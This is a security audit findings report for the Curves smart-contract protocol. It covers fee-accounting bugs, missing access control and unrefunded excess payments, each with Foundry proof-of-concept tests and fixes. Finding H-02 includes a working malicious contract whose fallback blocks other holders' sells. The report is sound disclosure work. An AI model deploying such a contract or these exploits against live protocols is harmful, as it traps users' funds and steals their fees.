# Curves Audit Contest - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Transferring curves token does not update sender's accumulated fee](#H-01)
    - ### [H-02. Malicious Subject Can Prevent Sell Calls and Profit Because of Unprotected call](#H-02)
    - ### [H-03. Anyone Can Change The Curves address in FeeSplitter because of lack of Access Control](#H-03)
- ## Medium Risk Findings
    - ### [M-01. Fees are not accumulating because of wrong implementation of "onBalanceChange()](#M-01)
    - ### [M-02. Send Excess Ethers Back  ](#M-02)
- ## Low Risk Findings
    - ### [L-01. Every Balance Change Push The Same Token to The Array](#L-01)
    - ### [L-02. First Share Buy Should Be "1" Because of Math Underflow  ](#L-02)
    - ### [L-03. Unnecessary receive() function in FeeSplitter ](#L-03)



# <a id='contest-summary'></a>Contest Summary


### Dates: Jan 8th, 2024 - Jan 18th, 2024


# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 3
   - Medium: 2
   - Low: 3


# High Risk Findings

## <a id='H-01'></a>H-01. Transferring curves token does not update sender's accumulated fee 

# Vulnerability details

## Impact
During sellCurvesToken() and buyCurvesToken() fee contract is called because of _transferFees function and values related to fees are updated. But in the case of direct token transfer between parties, this fee contract is not called and does not updated. Hence if sender didn't claimed his fees yet, all the fees will be belong to receiver after token transfer. We know that purpose of fees is holding tokens, hence obviously, transferring tokens after holding them for a while shouldn't send the earned fee to receiver.

## Proof of Concept
Setup:
1. Create a new folder and run "forge init" inside.
2. Paste all 4 contracts that are related to audit to the src folder.
3. Install openzeppelin via "forge install openzeppelin/openzeppelin-contracts@v4.9.3
4. Create a remappings.txt in the root folder and paste the following:
"@openzeppelin/=lib/openzeppelin-contracts/"
5. Create a test file in test folder named Curves.t.sol
6. Paste the following setup inside:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import {Test, console2} from "forge-std/Test.sol";
import {Curves} from "../src/Curves.sol";
import {CurvesERC20} from "../src/CurvesERC20.sol";
import {FeeSplitter} from "../src/FeeSplitter.sol";
import {Security} from "../src/Security.sol";
import {CurvesERC20Factory} from "../src/CurvesERC20Factory.sol";

contract CurvesTest is Test {

    address public owner = makeAddr("owner");
    address public manager = makeAddr("manager");
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    address public attacker = makeAddr("attacker");
    address public treasury = makeAddr("treasury");

    Curves curves;
    CurvesERC20Factory factory;
    FeeSplitter feeSplitter;

    function setUp() public {
        feeSplitter = new FeeSplitter();
        factory = new CurvesERC20Factory();
        curves = new Curves(address(factory), address(feeSplitter));
        curves.setManager(address(manager), true);
        curves.transferOwnership(address(owner));
        feeSplitter.transferOwnership(address(owner));

        vm.startPrank(manager);
        curves.setMaxFeePercent(2e17);
        curves.setExternalFeePercent(5e16, 0, 1e17);
        vm.stopPrank();

        vm.startPrank(owner);
        feeSplitter.setCurves(Curves(curves));
        feeSplitter.setManager(address(curves),true);

        curves.setProtocolFeePercent(5e16, payable(treasury));
        vm.stopPrank();

        vm.deal(alice, 100e18);
        vm.deal(bob, 100e18);

    }
```
Test for the vulnerability:
```solidity
    function testTransfer() public {
        vm.startPrank(alice);
        curves.buyCurvesToken(address(alice),1);
        vm.stopPrank();
        vm.startPrank(bob);
        uint256 priceForBuy = curves.getBuyPriceAfterFee(address(alice), 100);
        curves.buyCurvesToken{value: priceForBuy}(address(alice), 100);
        uint256 feeBobBefore = feeSplitter.getClaimableFees(address(alice), address(bob));
        curves.transferCurvesToken(address(alice), address(john), 100);
        uint256 feeBobAfter = feeSplitter.getClaimableFees(address(alice), address(bob));
        uint256 feeJohn = feeSplitter.getClaimableFees(address(alice),address(john));
        console2.log("senders claimable fee before transfer:", feeBobBefore);
        console2.log("senders claimable fee after transfer:", feeBobAfter);
        console2.log("receivers claimable fee:", feeJohn);
    }
```
run "forge test --match-test testTransfer -vv"
Output:
```
[PASS] testTransfer() (gas: 478883)
Logs:
  senders claimable fee before transfer: 2093750000000000000
  senders claimable fee after transfer: 0
  receivers claimable fee: 2093750000000000000
```
As we can see the sender lose their earned fees after transfer. I would like to also mention that fees are not close to dust amount in this protocol. Price increases with supply and fees are also increasing with supply. In one instance of protocol tests, holder fee is setted as %10. Hence the amount that senders will lose with transfer can easily be in the levels of 1e17>1e19 (0.1 ETH to 10 ETH).

## Recommended Mitigation Steps
After every transfer action, update senders fee in feeSplitter(unclaimed fees should be updated and also userFeeOffset should become equal to cumulativeFeePerToken after unclaimed fee update).

In an ideal scenario it should be enough to add

"feeSplitter.onBalanceChange()" call to the "_transfer" function for both sender and receiver. But since this function (onBalanceChange) has also a vulnerability (submitted it in another report), I can suggest first to solve that issue, then add that function call to _transfer() call.

Note: Transfers that have Curves.sol contract in one side should be excluded from this effect since Curves contracts' balance is removed from totalSupply() in FeeSplitter.sol, it can create further problems. Simple check in _transfer function before updating fees can be implemented for this scenario.

## <a id='H-02'></a>H-02. Malicious Subject Can Prevent Sell Calls and Profit Because of Unprotected call

# Vulnerability details

## Impact
During every buy and sell token call, _transferFees() function is called, and in this function call contract gives the execution to subject via sending subjectFee with .call:
```solidity
            {
                (bool success2, ) = curvesTokenSubject.call{value: subjectFee}("");
                if (!success2) revert CannotSendFunds();
            }
```

Malicious actor can create a contract and make tokenSubject a contract, not EOA.
Unprotected call is not a big problem alone because CEI pattern is implemented in contract and re-entrancy won't create a problem. If malicious contract reverts on transfer calls this is not also a problem since in this case nobody can buy or sell tokens including malicious actor.

But there is a way to create a malicious contract such that buyCurvesTokens() calls won't fail but sellCurvesTokens() call will fail (except malicious actor's sell call). If this happens (Which I will make it happen with PoC in the upcoming part), all users other than malicious actor will lose their funds(they will be stuck in the contract), while malicious actor profit because of token valuation.

**IMPORTANT** : Same is true for referral call, exact same steps can be applied by malicious referral. Also subject is the one who choose the referral adress, hence in this matter subject can be EOA and choose referral as a malicious contract which leads to same vulnerability that I will explain below. But to make it simple I am just writing the details for subject, but all I am providing is also true for referral call and it should be prevented.
## Proof of Concept
Setup:
1. Create a new folder and run "forge init" inside.
2. Paste all 4 contracts that are related to audit to the src folder.
3. Install openzeppelin via "forge install openzeppelin/openzeppelin-contracts@v4.9.3
4. Create a remappings.txt in the root folder and paste the following:
"@openzeppelin/=lib/openzeppelin-contracts/"
5. Create a test file in test folder named Curves.t.sol
6. Paste the following setup inside:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import {Test, console2} from "forge-std/Test.sol";
import {Curves} from "../src/Curves.sol";
import {CurvesERC20} from "../src/CurvesERC20.sol";
import {FeeSplitter} from "../src/FeeSplitter.sol";
import {Security} from "../src/Security.sol";
import {CurvesERC20Factory} from "../src/CurvesERC20Factory.sol";

interface ICurves {
    function buyCurvesToken(address, uint256) external payable;
    function getBuyPriceAfterFee(address, uint256) external returns(uint256);
    function curvesTokenSupply(address) external returns(uint256);
}
contract Malicious {

    uint256 public lastSupply;
    address public curves;
    bool public locked;


    constructor (address _curves) payable {
        curves = _curves;
        locked = true;
    }

    function buyFirstTime() public {
        ICurves(curves).buyCurvesToken(address(this), 1);
    }

    function updateSupply() public {
        lastSupply = ICurves(curves).curvesTokenSupply(address(this));
    }

    function changeLock(bool isLocked) public {
        locked = isLocked;
    }

    function buy(uint256 amount) public {
        uint256 price = ICurves(curves).getBuyPriceAfterFee(address(this), amount);
        ICurves(curves).buyCurvesToken{value:price}(address(this),amount);
    }
    fallback(bytes calldata) external payable returns(bytes memory){
        if (locked) {
            uint256 currentSupply = ICurves(curves).curvesTokenSupply(address(this));
            if (currentSupply < lastSupply) {
            revert();
        }
            else {
            return "";
        }
    }
        else {
            return "";
        }
}
}
contract CurvesTest is Test {

    address public owner = makeAddr("owner");
    address public manager = makeAddr("manager");
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    address public john = makeAddr("john");
    address public attacker = makeAddr("attacker");
    address public treasury = makeAddr("treasury");

    Curves curves;
    CurvesERC20Factory factory;
    FeeSplitter feeSplitter;
    Malicious malicious;





    function setUp() public {
        feeSplitter = new FeeSplitter();
        factory = new CurvesERC20Factory();
        curves = new Curves(address(factory), address(feeSplitter));
        curves.setManager(address(manager), true);
        curves.transferOwnership(address(owner));
        feeSplitter.transferOwnership(address(owner));

        vm.startPrank(manager);
        curves.setMaxFeePercent(2e17);
        curves.setExternalFeePercent(5e16, 0, 1e17);
        vm.stopPrank();

        vm.startPrank(owner);
        feeSplitter.setCurves(Curves(curves));
        feeSplitter.setManager(address(curves),true);
        curves.setProtocolFeePercent(5e16, payable(treasury));
        vm.stopPrank();

        vm.deal(alice, 100e18);
        vm.deal(bob, 100e18);
        vm.deal(john, 100e18);
        malicious = new Malicious{value:10e18}(address(curves));

    }
```
Before going to test function let's examine the malicious contract:
1. It has a variable "locked" which starts with true and when malicious actor wants to withdraw, they can change it to false > withdraw > change to true again. (The contract is just prototype, no access control provided, normally it should be only callable by owner)
2. It has a variable "lastSupply" which changes every time user fetches data from Curves. In the test function I manually called this function (updateSupply()), but in reality, malicious actor can use automation tools/bots in order to periodically fetch data (also front-running might be used in here instead of periodical update, curves use form network which is a op stack network, you can check front-running capabilites of op stack networks currently and for the future from here: https://help.optimism.io/hc/en-us/articles/4444375174299-Is-transaction-front-running-possible-on-OP-Mainnet- )
3. It compares last fetched supply with the current supply via fetching again in fallback. If supply is increasing it return "", which indicates success. If supply is decreasing (sellCurvesToken), it reverts and hence blocking sell calls.
Let's continue with our test function:
```solidity
    function testBlockingSell() public {
        malicious.buyFirstTime();
        malicious.updateSupply();
        malicious.buy(10);
        malicious.updateSupply();
        vm.startPrank(alice);
        uint256 priceForBuy = curves.getBuyPriceAfterFee(address(malicious), 10);
        curves.buyCurvesToken{value:priceForBuy}(address(malicious), 10);
        vm.stopPrank();
        malicious.updateSupply();
        vm.startPrank(bob);
        priceForBuy = curves.getBuyPriceAfterFee(address(malicious), 10);
        curves.buyCurvesToken{value:priceForBuy}(address(malicious), 10);       
        vm.stopPrank();
        malicious.updateSupply();
        vm.startPrank(alice);
        vm.expectRevert();
        curves.sellCurvesToken(address(malicious),10);
    }
```
run "forge test --match-test testBlockingSell" and it will be succesful. Hence all buyCurvesToken calls from alice and bob will be succesful, but SellCurvesToken call from bob will revert because of the fallback function of malicious contract. Then whenever actor wants, they can change the locked variable to false, and sell their own tokens (Didn't include sell function in malicious contract, as I mentioned it is a prototype for showing the vulnerability).


## Recommended Mitigation Steps
1. Remove subject fee call from _transferFees.
2. Create a mapping subjectToFee such that it stores every subject's earned fee so far.
3. In _transferFees function update this variable.
4. Create a function withdrawFees with modifier only tokenSubject.
5. Send all accrued fees so far to the tokenSubject in this function and make delete them from mapping.

**WARNING** : Same procedure is also valid for referral call. Referral fee sending system is completely same as subject fee call. Hence it needs to be also changed. Same steps provided above should be implemented for also referral fee withdraw.

## <a id='H-03'></a>H-03. Anyone Can Change The Curves address in FeeSplitter because of lack of Access Control

# Vulnerability details

## Impact
Curves contract's address is settled in a function called "setCurves()" inside feeSplitter which is a public function and anyone can change this address. Since all logic of feeSplitter is dependendt on Curves contract, this disrupts all the functionality of the contract.

## Proof of Concept
Setup:
1. Create a new folder and run "forge init" inside.
2. Paste all 4 contracts that are related to audit to the src folder.
3. Install openzeppelin via "forge install openzeppelin/openzeppelin-contracts@v4.9.3
4. Create a remappings.txt in the root folder and paste the following:
"@openzeppelin/=lib/openzeppelin-contracts/"
5. Create a test file in test folder named Curves.t.sol
6. Paste the following setup inside:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import {Test, console2} from "forge-std/Test.sol";
import {Curves} from "../src/Curves.sol";
import {CurvesERC20} from "../src/CurvesERC20.sol";
import {FeeSplitter} from "../src/FeeSplitter.sol";
import {Security} from "../src/Security.sol";
import {CurvesERC20Factory} from "../src/CurvesERC20Factory.sol";

contract CurvesTest is Test {

    address public owner = makeAddr("owner");
    address public manager = makeAddr("manager");
    address public attacker = makeAddr("attacker");
    address public treasury = makeAddr("treasury");

    Curves curves;
    CurvesERC20Factory factory;
    FeeSplitter feeSplitter;

    function setUp() public {
        feeSplitter = new FeeSplitter();
        factory = new CurvesERC20Factory();
        curves = new Curves(address(factory), address(feeSplitter));
        feeSplitter.setManager(address(curves),true);
        curves.setManager(address(manager), true);
        curves.transferOwnership(address(owner));
        feeSplitter.transferOwnership(address(owner));

        vm.startPrank(manager);
        curves.setMaxFeePercent(2e17);
        curves.setExternalFeePercent(5e16, 0, 1e17);
        vm.stopPrank();

        vm.startPrank(owner);
        feeSplitter.setCurves(Curves(curves));
        curves.setProtocolFeePercent(5e16, payable(treasury));
        vm.stopPrank();

    }
```
Test for the vulnerability:
```solidity
    function testChangeCurves() public {
        vm.startPrank(attacker);
        console2.log("curves address before:", address(feeSplitter.curves()));
        feeSplitter.setCurves(Curves(attacker));
        console2.log("curves address after:", address(feeSplitter.curves()));
    }
```
Run the test via "forge test --match-test testChangeCurves -vv". Output will show that curves address has changed.


## Recommended Mitigation Steps
Add onlyOwner modifier to setCurves() function.

		
# Medium Risk Findings


## <a id='M-01'></a>M-01. Fees are not accumulating because of wrong implementation of "onBalanceChange()         

# Vulnerability details

## Impact
Curves' purpose for FeeSplitter.sol is accumulating rewards for token holders if holdersFee is active. The problem is, this accumulation does not reflected in the code, instead, in the actions of buy/sell curves token, user's unclaimed fees gets overwritten and became 0. Hence user can only claim the fees accumulated since her last buy/sell call, not before.
Let's dive into code and see exactly what happens:
1. In every buyCurvesToken/sellCurvesToken transaction, _transferFees function is called.
2. _transferFees function does the following regarding feeSplitter (feeRedistributor is feeSplitter.sol):
```solidity
            if (feesEconomics.holdersFeePercent > 0 && address(feeRedistributor) != address(0)) {
                feeRedistributor.onBalanceChange(curvesTokenSubject, msg.sender);
                feeRedistributor.addFees{value: holderFee}(curvesTokenSubject);
            }
```
3. onBalanceChange() function in the feeSplitter does the following:
```solidity
    function onBalanceChange(address token, address account) public {
        TokenData storage data = tokensData[token];
        data.userFeeOffset[account] = data.cumulativeFeePerToken;
        if (balanceOf(token, account) > 0) userTokens[account].push(token);
    }
```
In the second line of function context we see that userFeeOffset becomes cumulativeFeePerToken, hence user lose all the fees that she didn't claimed until now.
4. addFees() functions adds new fees to the contract via accumulating cumulativeFeePerToken:
```solidity
    function addFees(address token) public payable {
        uint256 totalSupply_ = totalSupply(token);
        if (totalSupply_ == 0) revert NoTokenHolders();
        TokenData storage data = tokensData[token];
        data.cumulativeFeePerToken += (msg.value * PRECISION) / totalSupply_;
    }
```
5. When user tries to claim her fees, claimFees() called:
```solidity
    function claimFees(address token) external {
        updateFeeCredit(token, msg.sender);
        uint256 claimable = getClaimableFees(token, msg.sender);
        if (claimable == 0) revert NoFeesToClaim();
        tokensData[token].unclaimedFees[msg.sender] = 0;
        payable(msg.sender).transfer(claimable);
        emit FeesClaimed(token, msg.sender, claimable);
    }
...
    function updateFeeCredit(address token, address account) internal {
        TokenData storage data = tokensData[token];
        uint256 balance = balanceOf(token, account);
        if (balance > 0) {
            uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;
            data.unclaimedFees[account] += owed / PRECISION;
            data.userFeeOffset[account] = data.cumulativeFeePerToken;
        }
    }
...
    function getClaimableFees(address token, address account) public view returns (uint256) {
        TokenData storage data = tokensData[token];
        uint256 balance = balanceOf(token, account);
        uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;
        return (owed / PRECISION) + data.unclaimedFees[account];
    }
```
As we can see the fee amount that accumulated for user is calculated using the difference between cumulativeFeePerToken and userFeeOffset, but since every buy and share call in Curves.sol, onBalanceChange() is called and this diff became 0, after that with addFees() function diff became a value that is only related to last fee transfer action, not including the fees accumulated since alice's first deposit (or last time she claims the fees)


## Proof of Concept
Setup:
1. Create a new folder and run "forge init" inside.
2. Paste all 4 contracts that are related to audit to the src folder.
3. Install openzeppelin via "forge install openzeppelin/openzeppelin-contracts@v4.9.3
4. Create a remappings.txt in the root folder and paste the following:
"@openzeppelin/=lib/openzeppelin-contracts/"
5. Create a test file in test folder named Curves.t.sol
6. Paste the following setup inside:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import {Test, console2} from "forge-std/Test.sol";
import {Curves} from "../src/Curves.sol";
import {CurvesERC20} from "../src/CurvesERC20.sol";
import {FeeSplitter} from "../src/FeeSplitter.sol";
import {Security} from "../src/Security.sol";
import {CurvesERC20Factory} from "../src/CurvesERC20Factory.sol";

contract CurvesTest is Test {

    address public owner = makeAddr("owner");
    address public manager = makeAddr("manager");
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    address public attacker = makeAddr("attacker");
    address public treasury = makeAddr("treasury");

    Curves curves;
    CurvesERC20Factory factory;
    FeeSplitter feeSplitter;

    function setUp() public {
        feeSplitter = new FeeSplitter();
        factory = new CurvesERC20Factory();
        curves = new Curves(address(factory), address(feeSplitter));
        curves.setManager(address(manager), true);
        curves.transferOwnership(address(owner));
        feeSplitter.transferOwnership(address(owner));

        vm.startPrank(manager);
        curves.setMaxFeePercent(2e17);
        curves.setExternalFeePercent(5e16, 0, 1e17);
        vm.stopPrank();

        vm.startPrank(owner);
        feeSplitter.setCurves(Curves(curves));
        curves.setProtocolFeePercent(5e16, payable(treasury));
        vm.stopPrank();

        vm.deal(alice, 100e18);
        vm.deal(bob, 100e18);

    }
```
Test for the vulnerability:
```solidity
    function testNotAcculumatedFee() public {
        vm.startPrank(alice);
        curves.buyCurvesToken(address(alice),1);
        uint256 priceForBuy = curves.getBuyPriceAfterFee(address(alice), 100);
        curves.buyCurvesToken{value: priceForBuy}(address(alice), 100);
        uint256 firstFee = feeSplitter.getClaimableFees(address(alice),address(alice));
        priceForBuy = curves.getBuyPriceAfterFee(address(alice), 10);
        curves.buyCurvesToken{value: priceForBuy}(address(alice), 10);
        uint256 secondFee = feeSplitter.getClaimableFees(address(alice),address(alice));
        uint256 balanceBeforeClaimingFees = address(alice).balance;
        feeSplitter.claimFees(address(alice));
        uint256 balanceAfterClaimingFees = address(alice).balance;
        vm.stopPrank();
        uint256 idealAccumulatedFees = firstFee + secondFee;
        uint256 realAccumulatedFees = balanceAfterClaimingFees - balanceBeforeClaimingFees;
        assertNotEq(realAccumulatedFees, idealAccumulatedFees);
        console2.log("should accumulate:", idealAccumulatedFees);
        console2.log("accumulated:",realAccumulatedFees);
        console2.log("lost fees:", idealAccumulatedFees-realAccumulatedFees);
    }
```
If you run the test the output will be:
```
[PASS] testNotAcculumatedFee() (gas: 433184)
Logs:
  should accumulate: 2810843749999999897
  accumulated: 696156249999999897
  lost fees: 2114687500000000000

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.07ms
```
As we can see, alice could get 2.8e18 amount of fees if fees accumulated correctly, but instead she only gets 6.9e17, 4 times lower than ideal amount. This created scenario is very basic and doesn't involve much interactions. But even in this basic scenario alice lost 2.1 eth. In the real world, this will be much more and really harmful for protocol since these lost amounts won't be receivable by holders and will be stuck in contract.


## Recommended Mitigation Steps
Every time onBalanceChange() called, update users unclaimed fees. Only after that onBalanceChange() can freely update userFeeOffset since the unclaimed fees will be accumulating correctly.

## <a id='M-02'></a>M-02. Send Excess Ethers Back         

## Vulnerability details

buyCurvesToken() function and its derivatives are payable and receives ether in order to buy tokens. But in the internal function which complete the buy process, excess funds are not sent back and they are stuck in contract forever:
```solidity
    function _buyCurvesToken(address curvesTokenSubject, uint256 amount) internal {
        uint256 supply = curvesTokenSupply[curvesTokenSubject];
        if (!(supply > 0 || curvesTokenSubject == msg.sender)) revert UnauthorizedCurvesTokenSubject();

        uint256 price = getPrice(supply, amount);
        (, , , , uint256 totalFee) = getFees(price);

        if (msg.value < price + totalFee) revert InsufficientPayment();

        curvesTokenBalance[curvesTokenSubject][msg.sender] += amount;
        curvesTokenSupply[curvesTokenSubject] = supply + amount;
        _transferFees(curvesTokenSubject, true, price, amount, supply);

        // If is the first token bought, add to the list of owned tokens
        if (curvesTokenBalance[curvesTokenSubject][msg.sender] - amount == 0) {
            _addOwnedCurvesTokenSubject(msg.sender, curvesTokenSubject);
        }
    }
```
## Recommended Mitigation Steps
If (msg.value > price + totalFee), add excess funds to the newly created mapping userExcessEther, and create a function for user to withdraw this excess ether. It is best to make this a two step process, otherwise low level call's can create further problems.


## <a id='L-01'></a>L-01. Every Balance Change Push The Same Token to The Array

"onBalanceChange()" in FeeSplitter.sol is called whenever buyCurvesTokens() or sellCurvesToken() is called in Curves.sol which is every time some buy or sell action occurs (for msg.sender)
This function adds token address to userTokens arrays without checking if it exist or not:
```solidity
    function onBalanceChange(address token, address account) public {
        TokenData storage data = tokensData[token];
        data.userFeeOffset[account] = data.cumulativeFeePerToken;
        if (balanceOf(token, account) > 0) userTokens[account].push(token);
    }
```
Hence, every time user buy or sell from the same token, the same token address will be pushed to this array constantly making it bloat. This has 2 effects:
1. Functions "getUserTokens()" and "getUserTokensAndClaimables()" will return duplicate values:
```solidity
    function getUserTokens(address user) public view returns (address[] memory) {
        return userTokens[user];
    }

    function getUserTokensAndClaimable(address user) public view returns (UserClaimData[] memory) {
        address[] memory tokens = getUserTokens(user);
        UserClaimData[] memory result = new UserClaimData[](tokens.length);
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            uint256 claimable = getClaimableFees(token, user);
            result[i] = UserClaimData(claimable, token);
        }
        return result;
    }
```
Hence these two functions will not return what is expected.
2. Protocol suggests using these functions before batchClaiming():
```solidity
    //@dev: this may fail if the the list is long. Get first the list with getUserTokens to estimate and prepare the batch
    function batchClaiming(address[] calldata tokenList) external {
```
As we can see with this exact reason the list will be very long if not assessed before calling batchClaiming.

### Recommendation
Instead of direct push, create a function that checks if the token is available in userTokens[], if not, only then push the token inside array.

## <a id='L-02'></a>L-02. First Share Buy Should Be "1" Because of Math Underflow

Because of FriendTech's curve implementation, the first token buy by "subject" should be equal to 1. Any other tries to buy tokens will underflow and fail. Instead of expecting users to call the right value it is easy to solve this issue (not entirely but mostly).

### Recommendation
Since "buyCurvesTokenWithName()" and "buyCurvesTokenForPreSale()" functions are functions that will only be called once by "subject" in the first token buy. Instead of letting user to specify "amount" parameter, fix the amount to "1":
```diff
    function buyCurvesTokenForPresale(
        address curvesTokenSubject,
-       uint256 amount,
        uint256 startTime,
        bytes32 merkleRoot,
        uint256 maxBuy
    ) public payable onlyTokenSubject(curvesTokenSubject) {
        if (startTime <= block.timestamp) revert InvalidPresaleStartTime();
        uint256 supply = curvesTokenSupply[curvesTokenSubject];
        if (supply != 0) revert CurveAlreadyExists();
        presalesMeta[curvesTokenSubject].startTime = startTime;
        presalesMeta[curvesTokenSubject].merkleRoot = merkleRoot;
        presalesMeta[curvesTokenSubject].maxBuy = (maxBuy == 0 ? type(uint256).max : maxBuy);

-        _buyCurvesToken(curvesTokenSubject, amount);
+        _buyCurvesToken(curvesTokenSubject, 1);
    }
...
    function buyCurvesTokenWithName(
        address curvesTokenSubject,
-       uint256 amount,
        string memory name,
        string memory symbol
    ) public payable {
        uint256 supply = curvesTokenSupply[curvesTokenSubject];
        if (supply != 0) revert CurveAlreadyExists();

-       _buyCurvesToken(curvesTokenSubject, amount);
+       _buyCurvesToken(curvesTokenSubject, 1);
        _mint(curvesTokenSubject, name, symbol);
    }
```

## <a id='L-03'></a>L-03. Unnecessary receive() function in FeeSplitter

FeeSplitter has a receive() function but there is no way to use ether that is received via ether transfer to this contract. Also there is no way to withdraw funds that are sended to contract. Either remove the receive() function or create a way to use them (if you plan to receive donations).